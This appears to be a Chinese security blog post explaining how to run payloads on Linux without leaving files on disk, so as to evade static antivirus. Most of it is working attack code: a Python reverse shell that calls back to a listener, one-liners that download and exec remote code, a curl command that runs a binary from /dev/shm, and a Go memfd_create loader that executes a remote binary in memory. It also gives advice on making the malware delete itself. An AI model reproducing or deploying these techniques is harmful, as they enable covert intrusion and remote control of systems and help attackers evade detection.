
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/D1TA/p/18632355" title="发布于 2024-12-26 11:31">
    <span role="heading" aria-level="2">编译型语言的痛！但无文件落地我可以！！！</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        <img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226113101074-913562449.png" alt="编译型语言的痛！但无文件落地我可以！！！" class="desc_img">
        再不进来看，哭了我就不管你了！！！
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>声明：本文主要用作技术分享，所有内容仅供参考。任何使用或依赖于本文信息所造成的法律后果均与本人无关。请读者自行判断风险，并遵循相关法律法规。</p>
<p>@</p><div class="toc"><div class="toc-container-header">目录</div><ul><li><a href="#python-等脚本语言" rel="noopener nofollow">python 等脚本语言</a><ul><li><a href="#示例" rel="noopener nofollow">示例</a><ul><li><a href="#演示" rel="noopener nofollow">演示</a></li></ul></li></ul></li><li><a href="#golang-等静态编译型语言" rel="noopener nofollow">golang 等静态编译型语言</a><ul><li><a href="#内存文件系统" rel="noopener nofollow">内存文件系统</a></li><li><a href="#memfd_create-使用" rel="noopener nofollow">memfd_create 使用</a><ul><li><a href="#示例-1" rel="noopener nofollow">示例</a></li></ul></li></ul></li></ul></div><p></p>
<h2 id="python-等脚本语言">python 等脚本语言</h2>
<p>通过将powercat 无文件落地思路进行扩展，可以考虑到通过加载器以及payload等恶意代码执行文件，也可以使用无文件落地的方式对静态杀毒进行规避。</p>
<p>由于大多数Linux系统中都默认安装了 python ，且python作为一种脚本型语言，可以直接使用命令行代码执行操作，与powershell 有极大的相似之处，因此，使用python进行无文件落地思路是相同的。</p>
<h3 id="示例">示例</h3>
<p>首先准备一个恶意的python脚本放置在远端的服务器，用于文件下载</p>
<pre><code class="language-python">import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.220.151', 4444))

while True:
    command = s.recv(1024).decode('utf-8')
    if command.lower() == 'exit':
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)

s.close()
</code></pre>
<p>然后，使用python进行文件下载并执行，达到无文件落地的效果</p>
<pre><code class="language-python">import urllib.request
import subprocess

# 下载恶意 Python 脚本
url = 'http://192.168.220.151/payload.py'
response = urllib.request.urlopen(url)
code = response.read().decode('utf-8')

# 执行下载的脚本
exec(code)
</code></pre>
<p>但是，上述代码是脚本形式，要做到无文件落地执行，就需要完全在命令行执行代码。<br>
python中可以使用 python自带的控制端，按照上述代码逐句执行。</p>
<pre><code class="language-python">import urllib.request
response = urllib.request.urlopen('http://192.168.220.151/payload.py')
code = response.read().decode('utf-8')
exec(code)
</code></pre>
<p>也可以直接使用 <code>python -c</code> 来执行单行代码</p>
<pre><code class="language-python">import urllib.request; exec(urllib.request.urlopen('http://192.168.220.151/payload.py').read().decode('utf-8'))
</code></pre>
<p>或</p>
<pre><code class="language-python">python3 -c "import urllib.request; exec(urllib.request.urlopen('http://192.168.220.151/payload.py').read().decode('utf-8'))"
</code></pre>
<h4 id="演示">演示</h4>
<p>对payload所在目录开启web服务，用于下载恶意文件<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226112811682-662137793.png" alt="" loading="lazy"></p>
<p>攻击端开启监听<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226112828621-304259600.png" alt="" loading="lazy"></p>
<p>被控端操作，下载并执行恶意代码，实现无文件落地<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226112842929-301796550.png" alt="" loading="lazy"></p>
<p>攻击端成功接收<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226112856926-2016509836.png" alt="" loading="lazy"></p>
<p>来到被控端，并未发现payload，成功实现无文件落地<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226112911338-1138061989.png" alt="" loading="lazy"></p>
<h2 id="golang-等静态编译型语言">golang 等静态编译型语言</h2>
<p>由于golang、C、C++ 等静态编译语言的特性，无论如何规避，都需要有文件在系统种进行执行才可以，但并不是说无法做到完全无文件落地。</p>
<h3 id="内存文件系统">内存文件系统</h3>
<ul>
<li><strong>完全在内存中执行</strong>：<code>/dev/shm</code> 使用的是内存文件系统（<code>tmpfs</code>），文件存储在内存中，确保不会写入磁盘。</li>
<li><strong>快速执行</strong>：内存中的文件访问速度比磁盘文件快得多，因此可以提高执行效率。</li>
<li>通过将文件写入 <code>/dev/shm</code> 并从该目录下执行，文件完全存储在内存中，确保不会有文件写入磁盘，因此可以达到 <strong>完全无文件落地</strong> 的效果。</li>
<li>如果你希望确保完全避免文件留下，可以将执行完成后清理 <code>/dev/shm</code> 目录下的文件，这样可以进一步增强安全性。</li>
</ul>
<p>因此，对于编译型语言的二进制可执行文件的无文件落地，可以使用 <code>/dev/shm</code>  目录，例如：</p>
<pre><code class="language-sh">curl -s http://192.168.220.151/helloNum -o /dev/shm/helloNum &amp;&amp; chmod +x /dev/shm/helloNum &amp;&amp; /dev/shm/helloNum &amp;&amp; rm /dev/shm/helloNum
</code></pre>
<p>这样会将文件下载到 <code>/dev/shm/</code> 目录下，直接存储在内存中执行，并且在执行完毕后删除文件。</p>
<p><mark style="background: rgba(171, 247, 247, 0.65)">但这样也会产生一个问题</mark>，如果操作不当或者因不知名原因等导致恶意程序执行突然中断，那么就无法执行文件删除操作，因此，建议在恶意文件中加入 <mark style="background: rgba(210, 179, 255, 0.65)">保险程序</mark> 。</p>
<p>也就是说，一旦程序终止，自动执行自删除操作，<mark style="background: rgba(210, 179, 255, 0.65)">这里提供一种思路</mark>。<br>
如果将自删除程序写入恶意文件，那么如果恶意程序被主动结束，就无法正常执行后续操作，因此，可以在恶意程序执行时，首先写入一个文件到内存系统中，文件中可以有一些无意义操作用来避免安全检测，然后通过该文件实时监控恶意程序的执行状态。</p>
<h3 id="memfd_create-使用">memfd_create 使用</h3>
<p><code>memfd_create</code> 是 Linux 内核提供的系统调用，可以创建匿名文件，仅存在于内存中。这需要编写一些 C 代码或者使用支持该功能的高级语言。</p>
<p>以下是一个示例：</p>
<pre><code class="language-go">package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"golang.org/x/sys/unix"
	"syscall"
)

func main() {
	// 创建匿名内存文件
	fd, err := unix.MemfdCreate("helloNum", unix.MFD_CLOEXEC)
	if err != nil {
		panic(err)
	}

	// 将文件描述符包装为 os.File
	memFile := os.NewFile(uintptr(fd), "helloNum")
	defer memFile.Close()

	// 下载二进制文件到内存文件
	resp, err := http.Get("http://192.168.220.151/helloNum")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	_, err = io.Copy(memFile, resp.Body)
	if err != nil {
		panic(err)
	}

	// 将文件描述符重置到开始位置
	_, err = memFile.Seek(0, 0)
	if err != nil {
		panic(err)
	}

	// 使用 syscall.Exec 执行内存中的二进制文件
	err = syscall.Exec("/proc/self/fd/"+fmt.Sprint(memFile.Fd()), []string{}, os.Environ())
	if err != nil {
		panic(err)
	}
}
</code></pre>
<ol>
<li><code>unix.MemfdCreate("helloNum", unix.MFD_CLOEXEC)</code>：创建一个匿名的内存文件（也称为内存后备文件），这个文件存在于内存中，不会占用磁盘空间。<code>MFD_CLOEXEC</code> 标志意味着在执行 <code>exec</code> 系列函数时，这个文件描述符会自动关闭。</li>
<li><code>os.NewFile(uintptr(fd), "helloNum")</code>：将创建的内存文件描述符 <code>fd</code> 转换为 <code>os.File</code> 对象，这样可以使用标准库中的文件操作方法。</li>
<li><code>http.Get("http://192.168.220.151/helloNum")</code>：从指定的 URL 下载文件。</li>
<li><code>io.Copy(memFile, resp.Body)</code>：将 HTTP 响应体中的数据复制到内存文件中。</li>
<li><code>memFile.Seek(0, 0)</code>：将内存文件的读写指针移动到文件的开始位置。</li>
<li><code>syscall.Exec("/proc/self/fd/"+fmt.Sprint(memFile.Fd()), []string{}, os.Environ())</code>：这是代码中的关键部分。<code>syscall.Exec</code> 函数用于替换当前进程的映像为新的程序。这里它尝试使用内存文件的文件描述符来执行内存中的二进制文件。
<ul>
<li><code>/proc/self/fd/</code>：这是一个特殊的目录，它包含了当前进程打开的所有文件描述符的符号链接。每个符号链接指向一个实际打开的文件或设备。</li>
<li><code>fmt.Sprint(memFile.Fd())</code>：将内存文件的文件描述符转换为字符串。</li>
<li><code>[]string{}</code>：这是传递给 <code>Exec</code> 的参数列表，这里为空，意味着没有传递任何命令行参数。</li>
<li><code>os.Environ()</code>：这是传递给 <code>Exec</code> 的环境变量列表，它包含了当前进程的环境变量。</li>
</ul>
</li>
</ol>
<h4 id="示例-1">示例</h4>
<p>编写一个演示程序，每隔3秒打印一个数字，并编译为二进制可执行文件，作为演示的远端恶意可执行文件<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226112931044-178217338.png" alt="" loading="lazy"></p>
<p>开启web服务<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226112945846-657541286.png" alt="" loading="lazy"></p>
<p>将上述代码编译为二进制可执行文件 <code>memfd</code> ，并执行<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226112955468-677846287.png" alt="" loading="lazy"></p>
<p>在执行过程中查看文件执行位置，并不存在远端文件落地，该文件是被直接加载到内存中，替换了 memfd进程的映像为我们的远端恶意程序。<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241226113007017-779733697.png" alt="" loading="lazy"></p>
<p>欢迎关注 公众号 “D1TASec” ，获取更多姿势。</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.37112263325462963" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2024-12-26 11:32">2024-12-26 11:31</span>&nbsp;
<a href="https://www.cnblogs.com/D1TA">D1TAsec</a>&nbsp;
阅读(<span id="post_view_count">57</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18632355" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18632355);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18632355', targetLink: 'https://www.cnblogs.com/D1TA/p/18632355', title: '编译型语言的痛！但无文件落地我可以！！！' })">举报</a>
</div>
        